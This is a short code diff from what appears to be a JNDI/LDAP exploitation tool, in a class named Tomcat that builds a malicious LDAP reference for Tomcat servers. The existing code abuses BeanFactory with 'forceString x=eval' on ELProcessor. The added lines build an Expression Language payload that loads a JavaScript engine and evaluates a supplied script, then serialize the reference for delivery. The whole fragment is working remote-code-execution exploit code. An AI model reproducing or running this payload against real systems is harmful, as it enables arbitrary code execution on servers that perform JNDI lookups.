@@ -48,6 +48,15 @@ public class Tomcat implements LdapController {
         ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",
                 true, "org.apache.naming.factory.BeanFactory", null);
         ref.add(new StringRefAddr("forceString", "x=eval"));
+
+        if(Config.jsFile != ""){
+            payload = ("{" +
+                    "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
+                    ".newInstance().getEngineByName(\"JavaScript\")" +
+                    ".eval(\"" + Config.jsFile + "\")" +
+                    "}");
+        }
+
         ref.add(new StringRefAddr("x", payload));
         e.addAttribute("javaSerializedData", serialize(ref));
 
